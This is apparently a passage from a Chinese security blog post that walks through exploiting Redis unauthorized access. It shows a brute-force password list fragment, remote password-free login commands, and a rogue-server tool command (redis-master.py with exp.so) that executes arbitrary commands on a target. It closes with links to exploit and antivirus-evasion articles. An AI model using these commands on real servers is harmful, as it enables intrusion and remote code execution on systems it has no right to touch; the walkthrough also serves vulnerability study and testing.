admin
abc123
...
```

    使用工具检测命令

```
python redis-scan.py
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaztM8sVZdcueqEr5XyDicRSwUBjz0gUyLor7EWC9vtoRsjyBcDIBoIZw/640?wx_fmt=png)

**漏洞复现  
**

**linux 下载 redis-cli 远程连接工具**

```
wget http://download.redis.io/redis-stable.tar.gz
tar -zxvf redis-stable.tar.gz
cd redis-stable 
make     //使用make编译后进入 /src/文件夹下面 
cp src/redis-cli /usr/bin/        //拷贝文件到 /usr/bin 目录下，然后任意目录都可以使用 redis-cli 远程连接命令
redis-cli -h    // -h 后面跟ip地址
```

    使用 redis-cli 命令直接远程免密登录 redis 主机

```
# 无密码登录命令
redis-cli -h 目标主机IP
# 有密码登录命令
redis-cli -h 目标主机IP -p 端口6379 -a 登录密码
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUa46YWpg5qbJCl7IrsTr8ST0GcMQtia8DTB53o393oDMmtlVw6AkSk0OQ/640?wx_fmt=png)

    如果可以连接说明存在未授权访问漏洞

**linux 安装 redis-getShell 工具**

```
git clone https://github.com/vulhub/redis-rogue-getshell.git
cd RedisModulesSDK/
make
//克隆成功后使用cd命令切换到RedisModulesSDK 使用 make 命令进行编译，编译后回到 redis-rogue-getshell/ 目录下
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUauiaUWmFoamrZwpbp5iaecyCSoqq32eeibOxanMJ8xpZOoJwFH31WrdMkQ/640?wx_fmt=png)

    利用此工具进行 getshell，执行任意命令

```
# 工具命令格式：
python3 redis-master.py -r target-ip -p 6379 -L local-ip -P 8888 -f RedisModulesSDK/exp.so -c "要执行的命令"
# 工具命令示例：
python3 redis-master.py -r 192.168.126.130 -p 6379 -L 192.168.126.128 -P 8888 -f RedisModulesSDK/exp.so -c "whoami"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUaiaATKGIsD80ALeVhouX82bfs5g3jaC97PtfN8ictGrh6yhhJu9qiaQ5Bw/640?wx_fmt=png)

**利用工具下载地址** (https://github.com/n0b0dyCN/redis-rogue-server)

**最后贴一个未授权访问漏洞的利用工具** (下载地址: https://github.com/joaomatosf/jexboss/archive/master.zip)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDCokMqhbRcU8I4mRYib8zsUa8PuaayXrVMIAQHia6VCUgrddyqiarbjt0ZAKSXXfQ8ysbAIvSmLbEs6g/640?wx_fmt=png)

****【往期推荐】****  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - Shellcode Loader 原理 (python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - 分离 + 混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附 PoC】CVE-2021-2109 | Weblogic Server 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)

[【漏洞分析 | 附 EXP】CVE-2021-21985 VMware vCenter Server 远程代码执行漏洞](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487906&idx=1&sn=e35998115108336f8b7c6679e16d1d0a&chksm=ea37eef8dd4067ee13470391ded0f1c8e269f01bcdee4273e9f57ca8924797447f72eb2656b2&scene=21#wechat_redirect)

[【CNVD-2021-30167 | 附 PoC】用友 NC BeanShell 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247487897&idx=1&sn=6ab1eb2c83f164ff65084f8ba015ad60&chksm=ea37eec3dd4067d56adcb89a27478f7dbbb83b5077af14e108eca0c82168ae53ce4d1fbffabf&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)

一如既往的学习，一如既往的整理，一如即往的分享。![](https://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7QVywL8iaGT0QBGpOwgD1IwN0z9JicTRvzvnsJicNRr2gRvJib6jKojzC5CJJsFPkEbZQJ999HrH5Gw/640?wx_fmt=png)  

“**如侵权请私聊公众号删文**”

公众号